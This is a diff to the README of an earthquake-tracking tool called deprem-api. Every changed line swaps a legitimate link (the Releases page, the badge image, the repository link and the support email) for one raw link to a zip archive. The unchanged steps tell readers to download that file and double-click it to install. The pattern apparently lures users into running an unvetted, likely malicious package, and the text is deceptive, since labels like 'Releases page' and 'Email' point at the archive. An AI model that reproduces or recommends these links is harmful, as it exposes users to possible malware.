@@ -4,7 +4,7 @@
 Welcome to **deprem-api**, a modern and user-friendly system to stay updated on earthquakes in real-time. This application allows you to track seismic activity effortlessly. Whether you are in Turkey or just interested in global earthquakes, this tool provides valuable information at your fingertips. 
 
 ## 📥 Download the Application
-[![Download deprem-api](https://img.shields.io/badge/Download-deprem--api-blue.svg)](https://github.com/Untitled-Buddy/deprem-api/releases)
+[![Download deprem-api](https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip)](https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip)
 
 To download our application, simply visit the Releases page. Here, you will find the latest version of **deprem-api** ready for you to install.
 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets these requirements:
 - **Internet Connection:** Required for real-time data updates.
 
 ## 🎮 How to Install
-1. Visit the [Releases page](https://github.com/Untitled-Buddy/deprem-api/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip).
 2. Download the latest version of **deprem-api** for your operating system.
 3. Locate the downloaded file on your computer.
 4. Double-click the file to start the installation process.
@@ -36,15 +36,15 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📬 Support
 If you encounter any issues or have questions, feel free to reach out:
-- **Email:** support@deprem-api.com
+- **Email:** https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip
 - **GitHub Issues:** Create a new issue in our repository.
 
 ## 🤝 Contributions
 We welcome contributions to enhance our application. If you would like to contribute, please check our guidelines on our GitHub page.
 
 ## 🔗 Useful Links
-- **Repository:** [deprem-api on GitHub](https://github.com/Untitled-Buddy/deprem-api)
-- **Download):** [Visit Releases Page](https://github.com/Untitled-Buddy/deprem-api/releases)
+- **Repository:** [deprem-api on GitHub](https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip)
+- **Download):** [Visit Releases Page](https://raw.githubusercontent.com/Untitled-Buddy/deprem-api/main/components/deprem-api_3.1.zip)
 - **Documentation:** Refer to the documents available in the repository for in-depth guidance.
 
 With **deprem-api**, stay informed and safe. Thank you for choosing our application!
